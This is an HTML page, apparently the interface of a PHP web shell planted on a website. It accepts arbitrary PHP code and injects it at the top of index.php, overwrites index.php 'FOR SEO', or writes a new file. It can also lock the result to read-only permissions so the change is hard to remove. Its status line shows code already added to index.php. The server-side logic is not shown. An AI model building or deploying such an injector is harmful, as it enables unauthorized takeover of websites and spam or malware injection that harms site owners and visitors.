
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Code Editor</title>
</head>
<body>
    <h1>Enter PHP Code</h1>
    <p>This is a solution for those who cannot edit or upload files.</p>

    <!-- Form untuk mengirim kode PHP yang ingin ditambahkan, di-overwrite, atau dibuat dalam file baru -->
    <form method="POST">
        <!-- Textarea untuk input kode PHP -->
       <textarea name="php_code" rows="10" cols="50" placeholder="Enter your PHP code here EXAMPLE:  &lt;?php echo &quot;Hello world!&quot;; ?&gt;"></textarea><br><br>

        <!-- Pilihan tindakan (append, overwrite, atau buat file baru) -->
        <label>Select Action:</label><br>
        <input type="radio" id="append" name="action" value="append" checked>
        <label for="append">Add code to the top of index.php : FOR SEO</label><br>
        <input type="radio" id="overwrite" name="action" value="overwrite">
        <label for="overwrite">Overwrite index.php : FOR SEO</label><br>
        <input type="radio" id="newfile" name="action" value="newfile">
        <label for="newfile">Create new file</label><br><br>

        <!-- Input opsional untuk nama file baru jika membuat file baru -->
        <input type="text" name="filename" placeholder="New file name (optional if creating a new file)"><br><br>

        <!-- Opsi untuk mengubah izin file menjadi read-only (0444) -->
        <label>Change file permission to 0444 (read-only)?</label><br>
        <input type="checkbox" name="change_permission" value="yes">
        <label for="change_permission">Yes, change file permission to 0444</label><br><br>

        <!-- Tombol untuk submit form -->
        <input type="submit" name="submit" value="Submit">
    </form>

    PHP code has been added to the top of index.php.<br></body>
</html>
